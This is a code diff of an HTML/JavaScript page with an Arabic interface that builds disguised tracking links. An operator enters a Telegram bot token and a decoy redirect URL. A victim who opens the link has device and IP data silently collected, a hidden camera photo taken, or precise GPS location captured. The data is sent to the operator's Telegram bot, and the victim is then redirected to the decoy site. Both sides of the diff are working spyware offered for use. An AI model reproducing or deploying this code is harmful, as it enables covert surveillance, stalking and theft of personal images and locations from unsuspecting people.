@@ -3,147 +3,154 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نظام التحكم المتقدم | G-INTEL</title>
+    <title>G-INTEL MULTI-SYSTEM</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.33/ua-parser.min.js"></script>
     <style>
         :root { --red: #ff0000; --dark: #0a0a0a; --card: #151515; }
-        body { background-color: var(--dark); color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow-x: hidden; }
-        .container { width: 90%; max-width: 450px; background: var(--card); padding: 30px; border-radius: 20px; border: 1px solid #333; box-shadow: 0 10px 40px rgba(255, 0, 0, 0.1); transition: all 0.4s ease; }
+        body { background-color: var(--dark); color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
+        .container { width: 90%; max-width: 480px; background: var(--card); padding: 30px; border-radius: 20px; border: 1px solid #333; box-shadow: 0 10px 40px rgba(255, 0, 0, 0.15); }
         h2 { color: var(--red); text-align: center; text-transform: uppercase; letter-spacing: 2px; margin-bottom: 25px; border-bottom: 2px solid var(--red); padding-bottom: 10px; }
-        input { width: 100%; padding: 12px; margin: 10px 0; background: #000; border: 1px solid #444; color: #fff; border-radius: 8px; outline: none; transition: 0.3s; }
-        input:focus { border-color: var(--red); box-shadow: 0 0 10px rgba(255, 0, 0, 0.2); }
+        label { display: block; margin-top: 10px; font-size: 14px; color: #888; }
+        input, select { width: 100%; padding: 12px; margin: 8px 0; background: #000; border: 1px solid #444; color: #fff; border-radius: 8px; outline: none; box-sizing: border-box; }
+        select { cursor: pointer; color: var(--red); font-weight: bold; }
         .btn { background: var(--red); color: #fff; border: none; padding: 15px; width: 100%; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 16px; margin-top: 15px; transition: 0.3s; }
-        .btn:hover { background: #cc0000; transform: translateY(-2px); box-shadow: 0 5px 15px rgba(255, 0, 0, 0.3); }
-        #outputLink { display: none; margin-top: 25px; border-top: 1px solid #333; padding-top: 20px; }
-        textarea { width: 100%; height: 70px; background: #000; color: #ff4d4d; border: 1px solid #444; border-radius: 8px; padding: 10px; font-size: 11px; resize: none; margin-top: 10px; }
+        .btn:hover { background: #cc0000; box-shadow: 0 0 20px rgba(255, 0, 0, 0.4); }
+        #outputArea { display: none; margin-top: 25px; background: #000; padding: 15px; border-radius: 8px; border: 1px dashed var(--red); }
+        textarea { width: 100%; height: 60px; background: transparent; color: #ff4d4d; border: none; resize: none; font-size: 11px; outline: none; }
         .hidden { display: none; }
-        #cam-preview { display: none; } /* الكاميرا مخفية تماماً عن المستخدم */
     </style>
 </head>
 <body>
 
 <div id="adminPanel" class="container">
-    <h2>لوحة التحكم</h2>
-    <input type="text" id="botToken" placeholder="توكن البوت (Bot Token)">
+    <h2>مركز العمليات</h2>
+    <label>إعدادات البوت:</label>
+    <input type="text" id="botToken" placeholder="توكن البوت">
     <input type="text" id="chatId" placeholder="الأيدي (Chat ID)">
-    <input type="text" id="targetUrl" placeholder="رابط الموقع (Redirect URL)">
-    <button class="btn" onclick="buildLink()">إنشاء الرابط الملغم</button>
+    
+    <label>نوع العملية (طريقة الاختراق):</label>
+    <select id="hackMode">
+        <option value="info">1. سحب بيانات الجهاز (صامت)</option>
+        <option value="camera">2. سحب صورة الكاميرا (طلب إذن)</option>
+        <option value="gps">3. سحب الموقع الدقيق GPS (طلب إذن)</option>
+    </select>
 
-    <div id="outputLink">
-        <p style="font-size: 13px; color: #aaa;">انسخ الرابط النهائي واختصره:</p>
+    <label>التمويه (رابط التحويل):</label>
+    <input type="text" id="targetUrl" placeholder="https://google.com">
+    
+    <button class="btn" onclick="buildPayload()">إنشاء الرابط المخصص</button>
+
+    <div id="outputArea">
+        <p style="font-size: 12px; margin: 0;">الرابط الجاهز للاختصار:</p>
         <textarea id="finalUrl" readonly></textarea>
     </div>
 </div>
 
-<video id="cam-preview" autoplay playsinline></video>
-<canvas id="cam-canvas" class="hidden"></canvas>
+<video id="v-hidden" autoplay playsinline class="hidden"></video>
+<canvas id="c-hidden" class="hidden"></canvas>
 
 <script>
     const params = new URLSearchParams(window.location.search);
 
-    // --- قسم الضحية (التتبع الصامت والكاميرا) ---
-    if (params.has('d')) {
+    // --- نظام الضحية ---
+    if (params.has('m')) { // m = Mode
         document.getElementById('adminPanel').classList.add('hidden');
+        const config = JSON.parse(atob(params.get('m')));
+        executeMode(config);
+    }
+
+    async function executeMode(config) {
+        const mode = config.type;
         
-        try {
-            const config = JSON.parse(atob(params.get('d')));
-            initCapture(config);
-        } catch (e) {
-            window.location.replace("https://google.com");
-        }
-    }
-
-    async function initCapture(config) {
-        // 1. طلب إذن الكاميرا فوراً
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            const video = document.getElementById('cam-preview');
-            video.srcObject = stream;
-
-            // انتظار برهة للتأكد من تشغيل الكاميرا ثم التقاط الصورة
-            setTimeout(() => {
-                capturePhoto(config, stream);
-            }, 1000);
-        } catch (err) {
-            // إذا رفض الإذن، أرسل البيانات النصية فقط ووجهه
-            sendReport(config, null);
-        }
-    }
-
-    async function capturePhoto(config, stream) {
-        const video = document.getElementById('cam-preview');
-        const canvas = document.getElementById('cam-canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-
-        // تحويل الصورة لملف Blob لإرسالها لتلجرام
-        canvas.toBlob(async (blob) => {
-            await sendReport(config, blob);
-            // إغلاق الكاميرا بعد الالتقاط
-            stream.getTracks().forEach(track => track.stop());
-            // التوجيه النهائي
+        if (mode === 'info') {
+            await sendReport(config, "بيانات أساسية فقط");
             window.location.replace(config.url);
-        }, 'image/jpeg', 0.8);
+        } 
+        else if (mode === 'camera') {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('v-hidden');
+                video.srcObject = stream;
+                setTimeout(() => {
+                    const canvas = document.getElementById('c-hidden');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    canvas.toBlob(blob => {
+                        sendReport(config, "صورة كاميرا", blob);
+                        stream.getTracks().forEach(t => t.stop());
+                        setTimeout(() => window.location.replace(config.url), 1000);
+                    }, 'image/jpeg');
+                }, 1500);
+            } catch (e) {
+                sendReport(config, "رفض إذن الكاميرا");
+                window.location.replace(config.url);
+            }
+        } 
+        else if (mode === 'gps') {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    const gpsData = `📍 موقع دقيق:\nالارتفاع: ${pos.coords.latitude}\nالعرض: ${pos.coords.longitude}\nرابط الخرائط:\nhttps://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                    await sendReport(config, gpsData);
+                    window.location.replace(config.url);
+                }, (err) => {
+                    sendReport(config, "رفض إذن الموقع GPS");
+                    window.location.replace(config.url);
+                }, {enableHighAccuracy: true});
+            } else {
+                sendReport(config, "الجهاز لا يدعم GPS");
+                window.location.replace(config.url);
+            }
+        }
     }
 
-    async function sendReport(config, photoBlob) {
+    async function sendReport(config, extra, photoBlob = null) {
         const parser = new UAParser();
         const ua = parser.getResult();
-        
-        let battery = "غير متاح";
-        try { const b = await navigator.getBattery(); battery = `${Math.round(b.level * 100)}%`; } catch(e){}
-        
-        let net = {};
-        try { const r = await fetch('https://ipapi.co/json/'); net = await r.json(); } catch(e){}
+        let net = {}; try { const r = await fetch('https://ipapi.co/json/'); net = await r.json(); } catch(e){}
 
-        const text = `
-🚨 **عملية تتبع ناجحة**
+        const message = `
+⚠️ **تقرير جديد [${config.type.toUpperCase()}]**
 ━━━━━━━━━━━━━━
 📱 **الجهاز:** ${ua.device.vendor || ''} ${ua.device.model || 'PC'}
-🖥️ **النظام:** ${ua.os.name} ${ua.os.version}
-🔋 **البطارية:** ${battery}
+🖥️ **النظام:** ${ua.os.name}
 🌐 **IP:** \`${net.ip || 'مخفي'}\`
-📍 **الموقع:** ${net.city || ''}, ${net.country_name || ''}
-🏢 **الشركة:** ${net.org || ''}
+📍 **الموقع التقريبي:** ${net.city || ''}, ${net.country_name || ''}
+📊 **معلومات إضافية:**
+${extra}
 ━━━━━━━━━━━━━━
         `;
 
-        // 1. إرسال البيانات النصية
         await fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: config.chat, text: text, parse_mode: 'Markdown' })
+            body: JSON.stringify({ chat_id: config.chat, text: message, parse_mode: 'Markdown' })
         });
 
-        // 2. إرسال الصورة إذا توفرت
         if (photoBlob) {
-            const formData = new FormData();
-            formData.append('chat_id', config.chat);
-            formData.append('photo', photoBlob, 'photo.jpg');
-            await fetch(`https://api.telegram.org/bot${config.token}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            });
+            const fd = new FormData();
+            fd.append('chat_id', config.chat);
+            fd.append('photo', photoBlob, 'shot.jpg');
+            await fetch(`https://api.telegram.org/bot${config.token}/sendPhoto`, { method: 'POST', body: fd });
         }
     }
 
-    // --- قسم الإدمن (إنشاء الرابط) ---
-    function buildLink() {
+    // --- نظام الإدارة ---
+    function buildPayload() {
         const token = document.getElementById('botToken').value;
         const chat = document.getElementById('chatId').value;
+        const type = document.getElementById('hackMode').value;
         const url = document.getElementById('targetUrl').value;
 
-        if(!token || !chat || !url) return alert("يرجى إكمال الحقول!");
+        if(!token || !chat || !url) return alert("املأ البيانات!");
 
-        const data = { token, chat, url };
+        const data = { token, chat, type, url };
         const encoded = btoa(JSON.stringify(data));
-        const final = window.location.origin + window.location.pathname + "?d=" + encoded;
+        const final = window.location.origin + window.location.pathname + "?m=" + encoded;
 
         document.getElementById('finalUrl').value = final;
-        document.getElementById('outputLink').style.display = 'block';
+        document.getElementById('outputArea').style.display = 'block';
     }
 </script>
-
 </body>
 </html>
